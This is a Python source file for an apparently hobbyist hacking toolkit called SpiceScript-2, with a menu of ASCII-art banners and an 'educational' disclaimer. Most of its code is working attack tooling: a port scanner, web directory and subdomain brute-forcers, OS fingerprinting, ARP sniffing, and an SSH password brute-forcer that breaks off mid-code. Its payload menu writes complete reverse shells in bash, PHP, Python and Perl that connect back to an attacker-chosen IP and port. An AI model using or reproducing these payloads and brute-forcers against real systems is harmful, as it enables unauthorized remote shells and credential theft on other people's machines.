#!/usr/bin/env python3

try:
	import sys
	import os
	import time
	import json
	import socket
	import random
	import requests
	from scapy.all import *
	from scapy.layers.inet import IP, ICMP
	from queue import Queue
	import threading
	import shodan
	import paramiko
	import ftplib
	from colorama import init, Fore, Back, Style
	init()
	styleBold = '\u001b[1m'
	styleReset = '\u001b[0m'
	styleUnderline = '\u001b[4m'
except Exception as e:
	print(f'lol {e}')

def clear():
    if sys.platform == "win32":
        print('\n' * 100)
    else:
        os.system('clear')
disclaimer = f'''
{styleBold}SpiceScript{styleReset} & {styleBold}SpiceScript-2{styleReset} are programs/scripts meant to educate others
about Computer Security and allow insight on how any potential attackers
could operate, and allow a hands on experience to help inform people and 
help prevent real Cyber Attacks with this new found awareness.

The creator(s) of {styleBold}SpiceScript{styleReset} & {styleBold}SpiceScript-2{styleReset} 
are not responsible for any actions you commit using them, as this program is meant to
be used responsibly to educate others ethically and assist in it. 

Using some of these features on a person(s)'s owned technology without
their explicit permission is {Style.BRIGHT}{styleBold}{Fore.RED}illegal.{styleReset}{Style.RESET_ALL}


To accept these terms, say:

{Back.YELLOW}"I accept these terms."{Back.RESET}
'''


def success(message):
	print(f'{styleBold}{Fore.GREEN}{Style.BRIGHT}[+]{Style.RESET_ALL} {message}')
def warning(message):
	print(f'{styleBold}{Fore.YELLOW}{Style.BRIGHT}[!]{Style.RESET_ALL} {message}')
def error(message):
	print(f'{styleBold}{Fore.RED}{Style.BRIGHT}[x]{Style.RESET_ALL} {message}')
def startup():
	if os.geteuid() != 0:
		error(f'You MUST Run this as {styleBold}ROOT!{Fore.RESET}')
		sys.exit()
	else:
		global cfg
		terms = open('cfg.json', 'r')
		cfg = json.loads(terms.read())
		terms.close()
		if cfg['terms'] == "True":
			pass
		else:
			print(disclaimer)
			discresponse = input(f'{Fore.YELLOW}')
			print(f'{Fore.RESET}')
			if discresponse == 'I accept these terms.':
				termsw = open('cfg.json', 'w')
				ncfg = cfg
				ncfg['terms'] = "True"
				termsw.write(json.dumps(ncfg))
				termsw.close()
			else:
				sys.exit()
		global bannerenabled
		if cfg['banners'] == "True":
			bannerenabled = True
		else:
			bannerenabled = False

		global preferredthreads
		preferredthreads = int(cfg['threads'])
clear()
startup()
clear()

randomtop = []

randomtop.append(f'''{Fore.RED}                          _____                          
                   _.+sd$$$$$$$$$bs+._                   
               .+d$$$$$$$$$$$$$$$$$$$$$b+.               
            .sd$$$$$$$P^*^T$$$P^*"*^T$$$$$bs.            
          .s$$$$$$$$P*     `*' _._  `T$$$$$$$s.          
        .s$$$$$$$$$P          ` :$;   T$$$$$$$$s.        
       s$$$$$$$$$$;  db..+s.   `**'    T$$$$$$$$$s       
     .$$$$$$$$$$$$'  `T$P*'             T$$$$$$$$$$.     
    .$$$$$$$$$$$$P                       T$$$$$$$$$$.    
   .$$$$$$$$$$$$$b                       `$$$$$$$$$$$.   
  :$$$$$$$$$$$$$$$.                       T$$$$$$$$$$$;  
  $$$$$$$$$P^*' :$$b.                     d$$$$$$$$$$$$  
 :$$$$$$$P'      T$$$$bs._               :P'`*^T$$$$$$$; 
 $$$$$$$P         `*T$$$$$b              '      `T$$$$$$ 
:$$$$$$$b            `*T$$$s                      :$$$$$;
:$$$$$$$$b.                                        $$$$$;
$$$$$$$$$$$b.                                     :$$$$$$
$$$$$$$$$$$$$bs.                                 .$$$$$$$
$$$$$$$$$$$$$$$$$bs.                           .d$$$$$$$$
:$$$$$$$$$$$$$P*"*T$$bs,._                  .sd$$$$$$$$$;
:$$$$$$$$$$$$P     TP^**T$bss++.._____..++sd$$$$$$$$$$$$;
 $$$$$$$$$$$$b           `T$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ 
 :$$$$$$$$$$$$b.           `*T$$P^*"*"*^^*T$$$$$$$$$$$$; 
  $$$b       `T$b+                        :$$$$$$$BUG$$  
  :$P'         `"'               ,._.     ;$$$$$$$$$$$;  
   \                            `*TP*     d$$P*******$   
    \                                    :$$P'      /    
     \                                  :dP'       /     
      `.                               d$P       .'      
        `.                             `'      .'        
          `-.                               .-'          
             `-.                         .-'             
                `*+-._             _.-+*'                
                      `"*-------*"' {Fore.RESET}''')


randomtop.append(f'''{Fore.RED}      ooooooooooooooooooooooooooooooooooooo
      8                                8888
      8  {Back.YELLOW}oooooooooooooooooooooooooooood{Back.RESET}8888
      8  {Back.YELLOW}8888888888888888888888888P"   {Back.RESET}8888    oooooooooooooooo
      8  {Back.YELLOW}8888888888888888888888P"      {Back.RESET}8888    8              8
      8  {Back.YELLOW}8888888888888888888P"         {Back.RESET}8888    8             d8
      8  {Back.YELLOW}8888888888888888P"            {Back.RESET}8888    8            d88
      8  {Back.YELLOW}8888888888888P"               {Back.RESET}8888    8           d888
      8  {Back.YELLOW}8888888888P"                  {Back.RESET}8888    8          d8888
      8  {Back.YELLOW}8888888P"                     {Back.RESET}8888    8         d88888
      8  {Back.YELLOW}8888P"                        {Back.RESET}8888    8        d888888
      8  {Back.YELLOW}888P"                         {Back.RESET}8888    8       d8888888
      8 .od88888888888888888888888888888888    8      d88888888
      8888888888888888888888888888888888888    8     d888888888
                                               8    d8888888888
         ooooooooooooooooooooooooooooooo       8   d88888888888
        d                       ...oood8b      8  d888888888888
       d              ...oood888888888888b     8 d8888888888888
      d     ...oood88888888888888888888888b    8d88888888888888
     dood8888888888888888888888888888888888b {Fore.RESET}''')


randomtop.append(r'''
         _nnnn_                      
        dGGGGMMb     ,"""""""""""""".
       @p~qp~~qMb    | Linux Rules! |
       M|@||@) M|   _;..............'
       @,----.JM| -'
      JS^\__/  qKL
     dZP        qKRb
    dZP          qKKb
   fZP            SMMb
   HZM            MMMM
   FqM            MMMM
 __| ".        |\dS"qML
 |    `.       | `' \Zq
_)      \.___.,|     .'
\____   )MMMMMM|   .'
     `-'       `--' 
''')

randomtop.append(rf'''{Fore.RED}
          ___
        ,"---".
        :     ;
         `-.-'
          | |
          | |
          | | {Fore.RESET}
       _.-{Fore.RED}\_/{Fore.RESET}-._
    _ / |     | \ _
   / /   `---'   \ \
  /  `-----------'  \
 /,-""-.       ,-""-.\
( i-..-i       i-..-i )
|`|    |-------|    |'|
\ `-..-'  ,=.  `-..-'/
 `--------|=|-------'
          | |
          \ \
           ) ) 
          / /
         ( ( {Fore.RESET}''')

randomtop.append(rf'''{Fore.RED}
.-.{Fore.RESET}-----------{Fore.RED}.-.
| |{Fore.RESET}SpiceScript{Fore.RED}|#|
| |{Fore.RESET}-----------{Fore.RED}| |
| |{Fore.RESET}16-Bit-----{Fore.RED}| |
| |{Fore.RESET}Win32------{Fore.RED}| |
| "{Fore.RESET}-----------{Fore.RED}' |
|  .-----.-..   |
|  |     | || |||
|  |     | || \/|
"--^-----^-^^---'
''')

randomtop.append(rf'''{Fore.BLUE}
    ,d88b
 ,8P'    `8,
 8'       {Fore.RESET}_.{Fore.BLUE}8{Fore.RESET}._{Fore.BLUE}
8{Fore.RESET}       .'  |  '.
       /    |    \
      |    [_]    |
      |     |     |
      |-----'-----|
      |           |
      |           |
      |;         .|
      ;\         /;
       \\       //
        \'._ _.'/
         '-...-'
''')

randomtop.append(rf'''
              {Fore.RED}_{Fore.RESET}
             {Fore.RED}| |{Fore.RESET}
             {Fore.RED}| |==={Fore.RESET}( )   //////
             {Fore.RED}|_|{Fore.RESET}   |||  | o o|
                    ||| ( c  )                  ____
                     ||| \= /                  ||   \_
                      ||||||                   ||     |
                      ||||||                ...||__/|-"
                      ||||||             __|________|__
                        |||             |______________|
                        |||             || ||      || ||
                        |||             || ||      || ||
------------------------|||-------------||-||------||-||-------
                        |__>            || ||      || ||


''')


randomtop.append(rf'''{Fore.GREEN}
From: Veronica Karlsson

The "Internet" consists of many computers, all over the world, connected
to each other:

{Fore.RESET}
  ___   _      ___   _      ___   _      ___   _      ___   _
 [(_)] |=|    [(_)] |=|    [(_)] |=|    [(_)] |=|    [(_)] |=|
  '-`  |_|     '-`  |_|     '-`  |_|     '-`  |_|     '-`  |_|
 /mmm/  {Fore.RED}/     {Fore.RESET}/mmm/  {Fore.RED}/     {Fore.RESET}/mmm/  {Fore.RED}/     {Fore.RESET}/mmm/  {Fore.RED}/     {Fore.RESET}/mmm/  {Fore.RED}/
       |____________|____________|____________|____________|
                             |            |            |
                        {Fore.RESET} ___  {Fore.RED}\_      {Fore.RESET}___  {Fore.RED}\_      {Fore.RESET}___  {Fore.RED}\_{Fore.RESET}
                        [(_)] |=|    [(_)] |=|    [(_)] |=|
                         '-`  |_|     '-`  |_|     '-`  |_|
                        /mmm/        /mmm/        /mmm/

{Fore.GREEN}
These computers can then be used to communicate with each other in many
different ways. Three of the most common ones are "The Web", "Email" and
"Discussion groups" (also called "Newsgroups").
''')


randomtop.append(rf'''

  .d^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^b.
  $      `.                                    $
  $        `.                                .-$
  $          `.                          .-*'  $
  $            `.                    .-*'      $
  $              ;               .-*'          $
  $      .-'`.   |           .-*'    .         $
  $     /.'"`.\  |___________;   .-*'|         $
  $    ::     ;; |           |   |   |         $
  $    ||     || |           |   |   |         $
  $    ::     ;; |""""""""""";   | `"|         $
  $     \`._,'/  |           `*-.|   |         $
  $      `-..'   ;               `*-.|         $
  $            .'                    `*-.      $
  $          .'       .-.                `*-.  $
  $        .'      ._/   \                   `*$
  $      .'      .'_/     \_.                  $
  $. {Fore.RED}ENERGY 100{Fore.RESET} /.'/       \ `.      {Fore.RED}AMMO 320{Fore.RESET} .$
  `TssssssssssssssssssssssssssssssssssssssssssP'
''')


randomtop.append(rf'''{styleBold}
Fight Bugs{styleReset}                      |     |
                                \\_V_//
                                \/=|=\/
                                 [=v=]
                               __\___/_____
                              /..[  _____  ]
                             /_  [ [  M /] ]
                            /../.[ [ M /@] ]
                           <-->[_[ [M /@/] ]
                          /../ [.[ [ /@/ ] ]
     _________________]\ /__/  [_[ [/@/ C] ]
    <_________________>>0---]  [=\ \@/ C / /
       ___      ___   ]/000o   /__\ \ C / /
          \    /              /....\ \_/ /
       ....\||/....           [___/=\___/
      .    .  .    .          [...] [...]
     .      ..      .         [___/ \___]
     .    0 .. 0    .         <---> <--->
  /\/\.    .  .    ./\/\      [..]   [..]
 / / / .../|  |\... \ \ \    _[__]   [__]_
/ / /       \/       \ \ \  [____>   <____]
''')


randomtop.append(rf'''{Fore.GREEN}
             @      @
     / \     ( _____)      / \
   /  |  \___/*******\___/  |  \
  (   I  /   ~   '   ~   \  I   )
   \  |  |   {styleBold}{Fore.RESET}0       0{styleReset}{Fore.GREEN}   |  |  /
     \   |       A       |   /
       \__    _______    __/
          \_____________/
    _-------*         *-------_
   /  /---      VAX       ---\  \
 /  /     (    System   )     \  \
(  (     (    Gremlin!   )     )  )
 \  \    |               |    /  /
   \  \  |               |  /  /
    **** |               | ****
   //|\\  \_____________/  //|\\
   *         '*** ***'         *
  ***.       .*** ***.       .***
  '*************' '*************'
''')



randomtop.append(rf'''
             {Fore.RED}_.-;{Fore.GREEN};-._{Fore.RESET}
      '-..-'{Fore.RED}|   |{Fore.GREEN}|   |{Fore.RESET}
      '-..-'{Fore.RED}|_.-;{Fore.GREEN};-._|{Fore.RESET}
      '-..-'{Fore.BLUE}|   |{Fore.YELLOW}|   |{Fore.RESET}
      '-..-'{Fore.BLUE}|_.-'{Fore.YELLOW}'-._|{Fore.RESET}
''')


randomtop.append(r'''
 ______________________
< spicesouls.github.io >
 ----------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
''')

randomtop.append(rf'''
+-----------------+
|                 |
|                 | {Fore.RED}X    X            X{Fore.RESET}
|                 |   {Fore.RED}XX{Fore.RESET}
|   Basic Text    |{Fore.RED}XX X{Fore.RESET}  +\',
|                 |{Fore.RED}XX{Fore.RESET}  .' \\+
|                   __+   +~ {Fore.RED}XX{Fore.RESET}
|                 {Fore.RED}X{Fore.RESET}/\ \_. \     {Fore.RED}X  X{Fore.RESET}
+----------------{Fore.RED}X{Fore.RESET} \ \+  \ \   {Fore.RED}XX{Fore.RESET}
|                  {Fore.RED}X{Fore.RESET}\/    \ \
| [ INITIALIZED ]{Fore.RED}X   XX  X{Fore.RESET} \ \       {Fore.RED}X{Fore.RESET}
|                 {Fore.RED}XX{Fore.RESET}        \ \
|      Data       |{Fore.RED}XX X{Fore.RESET}      \ \
|                 | {Fore.RED}XX{Fore.RESET}        \ \  {Fore.RED}X{Fore.RESET}
| [UNINITIALIZED] |  {Fore.RED}X   X{Fore.RESET}     \/   {Fore.RED}X     X{Fore.RESET}
|                 |  {Fore.RED}X    X         XX{Fore.RESET}
+-----------------+ {Fore.RED}X   X       X{Fore.RESET}
|                 |    {Fore.RED}XX             X{Fore.RESET}
|                 |      {Fore.RED}X{Fore.RESET}
|                 |
|      Stack      |
|                 |
|                 |
+-----------------+

{styleBold}SMASH THE STACK!{styleReset}

''')

randomtop.append(fr'''{Fore.GREEN}
               (`.         ,-,
               `\ `.    ,;' /
                \`. \ ,'/ .'
          __     `.\ Y /.'
       .-'  ''--.._` ` (
     .'            /   `
    ,           ` '   Q '
    ,         ,   `._    \
    |         '     `-.;_'
    `  ;    `  ` --,.._;
    `    ,   )   .'
     `._ ,  '   /_
        ; ,''-,;' ``-
         ``-..__\``--`  {Fore.RESET}Wake up, Neo
''')

def loopbreak():
	clear()
	if bannerenabled == True:
		top = random.choice(randomtop)
	else:
		top = ''
	banner = f'''{top}{styleBold}{Fore.YELLOW}                                                    
 _____     _         _____         _     _      ___ 
|   __|___|_|___ ___|   __|___ ___|_|___| |_   |_  |
|__   | . | |  _| -_|__   |  _|  _| | . |  _|  |  _|
|_____|  _|_|___|___|_____|___|_| |_|  _|_|    |___|
      |_|                           |_|              {styleReset}
Your Cyber Swiss Army Knife!			  

Made By {styleBold}{Fore.YELLOW}SpiceSouls{styleReset}
Version {styleBold}{Fore.YELLOW}1.0.0{styleReset}'''
	print(banner)
	print(menu)

if bannerenabled == True:
	top = random.choice(randomtop)
else:
	top = ''
banner = f'''{top}{styleBold}{Fore.YELLOW}                                                    
 _____     _         _____         _     _      ___ 
|   __|___|_|___ ___|   __|___ ___|_|___| |_   |_  |
|__   | . | |  _| -_|__   |  _|  _| | . |  _|  |  _|
|_____|  _|_|___|___|_____|___|_| |_|  _|_|    |___|
      |_|                           |_|              {styleReset}
Your Cyber Swiss Army Knife!			  

Made By {styleBold}{Fore.YELLOW}SpiceSouls{styleReset}
Version {styleBold}{Fore.YELLOW}1.0.0{styleReset}'''
print(banner)

menu = f'''
{styleBold}-1-{styleReset} Enumeration
{styleBold}-2-{styleReset} Payloads
{styleBold}-3-{styleReset} Networking
{styleBold}-4-{styleReset} Extras
{styleBold}-5-{styleReset} Settings

{styleBold}-0-{styleReset} Exit
'''
print(menu)
while True:
	try:
		menuchoice = str(input(f'{styleBold}#{styleReset} '))

		if menuchoice == '0':
			clear()
			print(f'{styleBold}Bye Bye! {styleReset}٩(^ᴗ^)')
			sys.exit()
		else:

################################################### Web Enumeration
			if menuchoice == '1':
				clear()
				if bannerenabled == True:
					top = random.choice(randomtop)
				else:
					top = ''
				banner = f'''{top}{styleBold}{Fore.YELLOW}                                                    
 _____     _         _____         _     _      ___ 
|   __|___|_|___ ___|   __|___ ___|_|___| |_   |_  |
|__   | . | |  _| -_|__   |  _|  _| | . |  _|  |  _|
|_____|  _|_|___|___|_____|___|_| |_|  _|_|    |___|
      |_|                           |_|              {styleReset}
Your Cyber Swiss Army Knife!			  

Made By {styleBold}{Fore.YELLOW}SpiceSouls{styleReset}
Version {styleBold}{Fore.YELLOW}1.0.0{styleReset}'''
				print(banner)
				emenu = f'''
{styleBold}-1-{styleReset} Port Scan
{styleBold}-2-{styleReset} Directory BruteForcing
{styleBold}-3-{styleReset} Subdomain BruteForcing
{styleBold}-4-{styleReset} OS Fingerprinter

{styleBold}-0-{styleReset} Return To Menu
'''
				print(emenu)
				while True:
					
					emenuchoice = str(input(f'{styleBold}#{styleReset}/Enumeration '))

					############################################################################### PORT SCANNING
					if emenuchoice == '1':
						clear()
						ipaddr = str(input(f'IP {Fore.YELLOW}>>>{Fore.RESET} '))
						openports = []
						try:
							print_lock = threading.Lock()
							def portscan(port):
								s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
								socket.setdefaulttimeout(1) 
						          
								# returns an error indicator 
								result = s.connect_ex((ipaddr,port)) 
								if result == 0: 
									with print_lock:
										if str(port) == '22':
											extra = ' - SSH?'
										elif str(port) == '53':
											extra = ' - DNS?'
										elif str(port) == '123':
											extra = ' - NTP?'
										elif str(port) == '80':
											extra = ' - HTTP?'
											try:
												r = requests.get(f'http://{ipaddr}')
												try:
													contenttype = r.headers['Content-Type']
													success(f'HTTP - Content-Type: {contenttype}')
												except:
													pass
												try:
													server = r.headers['Server']
													success(f'HTTP - Server: {server}')
												except:
													pass
												try:
													xpb = r.headers['X-Powered-By']
													success(f'HTTP - X-Powered-By: {xpb}')
												except:
													pass
											except requests.exceptions.SSLError:
												pass
										elif str(port) == '194':
											extra = ' - IRC?'
										elif str(port) == '443':
											extra = ' - HTTPS?'
											try:
												r = requests.get(f'https://{ipaddr}')
												try:
													contenttype = r.headers['Content-Type']
													success(f'HTTPS - Content-Type: {contenttype}')
												except:
													pass
												try:
													server = r.headers['Server']
													success(f'HTTPS - Server: {server}')
												except:
													pass
												try:
													xpb = r.headers['X-Powered-By']
													success(f'HTTPS - X-Powered-By: {xpb}')
												except:
													pass
											except requests.exceptions.SSLError:
												pass
										elif str(port) == '8080':
											extra = ' - PROXY?'
										elif str(port) == '21':
											extra = ' - FTP?'
										else:
											extra = ''
										warning(f'Port Discovered: {port}{extra}')
										openports.append(f'{port}')
								else:
									pass
								s.close()
											# How threading works: i dont fucking know but if it aint broke dont fix it
							def threader():
								while True:
									worker = q.get()
									portscan(worker)
									q.task_done()
							q = Queue()
							for x in range(int(preferredthreads)):
								t = threading.Thread(target=threader)
								t.daemon = True
								t.start()
							start = time.time()
							for worker in range(1, 10000):
								q.put(worker)
							q.join()
						except KeyboardInterrupt:
							pass

						success('Port Scanning has finished!')
						input('Press ENTER To Continue.')
						loopbreak()
						break
					
					############################################################################### DIRECTORY BRUTEFORCING
					if emenuchoice == '2':
						clear()
						url = str(input(f'URL {Fore.YELLOW}>>>{Fore.RESET} '))
						wordlist = str(input(f'WORDLIST {Fore.YELLOW}>>>{Fore.RESET} '))
						bads = [404, 400, 401, 402, 403]
						exts = ['html', 'js', 'java', 'css', 'php', 'asp', 'htm', 'txt']
						def check(url, extension):
							r = requests.get(url + '/' + extension)
							if r.status_code in bads:
								pass
							else:
								warning(f'/{extension} [{str(r.status_code)}]')
							for ext in exts:
								r = requests.get(url + '/' + extension + '.' + ext)
								if r.status_code in bads:
									pass
								else:
									warning(f'/{extension}.{ext} [{str(r.status_code)}]')
						warning('Starting...')
						with open(wordlist, 'r') as o:
							try:
								for line in o:
									check(url, line[:-1])
							except KeyboardInterrupt:
								pass
							finally:
								o.close()
								print('')
						success('Finished!')
						input('Press ENTER To Continue.')
						loopbreak()
						break


					############################################################################### SUBDOMAIN BRUTEFORCING
					if emenuchoice == '3':
						clear()
						domain = str(input(f'DOMAIN {Fore.YELLOW}>>>{Fore.RESET} '))
						wordlist = str(input(f'WORDLIST {Fore.YELLOW}>>>{Fore.RESET} '))
						bads = [404, 400, 401, 402, 403]



						def check(domain, sub):
							try:
								r = requests.get(f'http://{sub}.{domain}')
							except requests.exceptions.ConnectionError:
								pass
							else:
								warning(f'{sub}.{domain} [{str(r.status_code)}]\n')

						warning('Starting...')
						with open(wordlist, 'r') as o:
							try:
								for line in o:
									check(domain, line[:-1])
							except KeyboardInterrupt:
								pass
							finally:
								o.close()
								print('')
						success('Finished')
						input('Press ENTER To Continue.')
						loopbreak()
						break


					if emenuchoice == '4':
						clear()
						ipaddr = str(input(f'IP {Fore.YELLOW}>>>{Fore.RESET} '))
						warning('Sending ICMP Packet to Fingerprint The OS...')
						try:
							pack = IP(dst=ipaddr)/ICMP()
							resp = sr1(pack, timeout=2)

							if resp == None:
								error('There was no response.')
							elif IP in resp:
								if resp.getlayer(IP).ttl <= 64:
									success('Suspected Server OS: Linux\n')
								else:
									success('Suspected Server OS: Windows\n')
						except Exception as e:
							error(f'{e}')
						input('Press ENTER To Continue.')
						loopbreak()
						break
								

					if emenuchoice == '0':
						loopbreak()
						break

################################################### Payloads


			if menuchoice == '2':
				clear()
				if bannerenabled == True:
					top = random.choice(randomtop)
				else:
					top = ''
				banner = f'''{top}{styleBold}{Fore.YELLOW}                                                    
 _____     _         _____         _     _      ___ 
|   __|___|_|___ ___|   __|___ ___|_|___| |_   |_  |
|__   | . | |  _| -_|__   |  _|  _| | . |  _|  |  _|
|_____|  _|_|___|___|_____|___|_| |_|  _|_|    |___|
      |_|                           |_|              {styleReset}
Your Cyber Swiss Army Knife!			  

Made By {styleBold}{Fore.YELLOW}SpiceSouls{styleReset}
Version {styleBold}{Fore.YELLOW}1.0.0{styleReset}'''
				print(banner)
				pmenu = f'''
{styleBold}-1-{styleReset} Bash Payload
{styleBold}-2-{styleReset} PHP Payload
{styleBold}-3-{styleReset} Python Payload
{styleBold}-4-{styleReset} Perl Payload

{styleBold}-0-{styleReset} Return To Menu
'''
				print(pmenu)
				while True:
					
					pmenuchoice = str(input(f'{styleBold}#{styleReset}/Payloads '))


					if pmenuchoice == '1':	
						clear()				
						ipaddr = str(input(f'IP TO CONNECT BACK TO {Fore.YELLOW}>>>{Fore.RESET} '))
						port = str(input(f'PORT TO CONNECT BACK TO {Fore.YELLOW}>>>{Fore.RESET} '))
						warning('Generating Payload...')
						payload = f'bash -i >& /dev/tcp/{ipaddr}/{port} 0>&1'
						with open('payload.sh', 'w') as o:
							o.write(payload)
							o.close()
						success(f'Payload written to {styleBold}payload.sh!{styleReset}')
						input('Press ENTER To Continue.')
						loopbreak()
						break

					if pmenuchoice == '2':
						clear()				
						ipaddr = str(input(f'IP TO CONNECT BACK TO {Fore.YELLOW}>>>{Fore.RESET} '))
						port = str(input(f'PORT TO CONNECT BACK TO {Fore.YELLOW}>>>{Fore.RESET} '))
						warning('Generating Payload...')
						payload = """
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '""" + ipaddr + """';  // CHANGE THIS
$port = """ + port + """;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
"""
						with open('payload.php', 'w') as o:
							o.write(payload)
							o.close()
						success(f'Payload written to {styleBold}payload.php!{styleReset}')
						input('Press ENTER To Continue.')
						loopbreak()
						break

					if pmenuchoice == '3':
						clear()				
						ipaddr = str(input(f'IP TO CONNECT BACK TO {Fore.YELLOW}>>>{Fore.RESET} '))
						port = str(input(f'PORT TO CONNECT BACK TO {Fore.YELLOW}>>>{Fore.RESET} '))
						warning('Generating Payload...')
						payload = f'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ipaddr}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
						with open('payload.py', 'w') as o:
							o.write(payload)
							o.close()
						success(f'Payload written to {styleBold}payload.py!{styleReset}')
						input('Press ENTER To Continue.')
						loopbreak()
						break


					if pmenuchoice == '4':
						clear()				
						ipaddr = str(input(f'IP TO CONNECT BACK TO {Fore.YELLOW}>>>{Fore.RESET} '))
						port = str(input(f'PORT TO CONNECT BACK TO {Fore.YELLOW}>>>{Fore.RESET} '))
						warning('Generating Payload...')
						payload = '''use Socket;$ip="''' + ipaddr + '''";$port=''' + port + ''';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($port,inet_aton($ip)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'''
						with open('payload.pl', 'w') as o:
							o.write(payload)
							o.close()
						success(f'Payload written to {styleBold}payload.pl{styleReset}')
						input('Press ENTER To Continue.')
						loopbreak()
						break


					if pmenuchoice == '0':
						loopbreak()
						break


			if menuchoice == '3':
				clear()
				if bannerenabled == True:
					top = random.choice(randomtop)
				else:
					top = ''
				banner = f'''{top}{styleBold}{Fore.YELLOW}                                                    
 _____     _         _____         _     _      ___ 
|   __|___|_|___ ___|   __|___ ___|_|___| |_   |_  |
|__   | . | |  _| -_|__   |  _|  _| | . |  _|  |  _|
|_____|  _|_|___|___|_____|___|_| |_|  _|_|    |___|
      |_|                           |_|              {styleReset}
Your Cyber Swiss Army Knife!			  

Made By {styleBold}{Fore.YELLOW}SpiceSouls{styleReset}
Version {styleBold}{Fore.YELLOW}1.0.0{styleReset}'''
				print(banner)
				nmenu = f'''
{styleBold}-1-{styleReset} List IPV4 Routes
{styleBold}-2-{styleReset} List IPV6 Routes
{styleBold}-3-{styleReset} Listen to ARP
{styleBold}-4-{styleReset} SSH Credential Bruteforcing
{styleBold}-5-{styleReset} FTP Credential Bruteforcing

{styleBold}-0-{styleReset} Return To Menu
'''
				print(nmenu)
				while True:
					
					nmenuchoice = str(input(f'{styleBold}#{styleReset}/Networking '))

					if nmenuchoice == '1':
						clear()
						warning('Getting IPV4 Routes...')
						print(conf.route)
						input('Press ENTER To Continue.')
						loopbreak()
						break

					if nmenuchoice == '2':
						clear()
						warning('Getting IPV6 Routes...')
						print(conf.route6)
						input('Press ENTER To Continue.')
						loopbreak()
						break


					if nmenuchoice == '3':
						clear()
						warning('Sniffing ARP Activity...')
						def arp_display(pkt):
							if pkt[ARP].op == 1: #who-has (request)
								return (f"[{Style.BRIGHT}{styleBold}{Fore.GREEN}ARP{Fore.RESET} who-has{styleReset}] " + str(pkt[ARP].psrc) + " is asking about " + str(pkt[ARP].pdst))
							if pkt[ARP].op == 2: #is-at (response)
								return (f"[{Style.BRIGHT}{styleBold}{Fore.GREEN}ARP{Fore.RESET} is-at{styleReset}] " + str(pkt[ARP].hwsrc) + " has address " + str(pkt[ARP].psrc))
						sniff(prn=arp_display, filter="arp", store=0)
						loopbreak()
						break


					if nmenuchoice == '4':
						clear()
						target = str(input(f'HOST FOR SSH {Fore.YELLOW}>>>{Fore.RESET} '))
						clear()
						username = str(input(f'USERNAME {Fore.YELLOW}>>>{Fore.RESET} '))
						clear()
						wordlist = str(input(f'WORDLIST FILE PATH {Fore.YELLOW}>>>{Fore.RESET} '))
						warning("Brute Forcing the credentials for " + str(username) + "@" + str(target) + "...")
						with open(wordlist, "r") as list:
							for line in list:
								password = line.strip()
								client = paramiko.SSHClient()
								client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
								try:
									client.connect(hostname=target, username=username, password=password, timeout=100, banner_timeout=200)
								except paramiko.AuthenticationException:
									print(f'\r' + ' ' * 50, flush=True, end='')
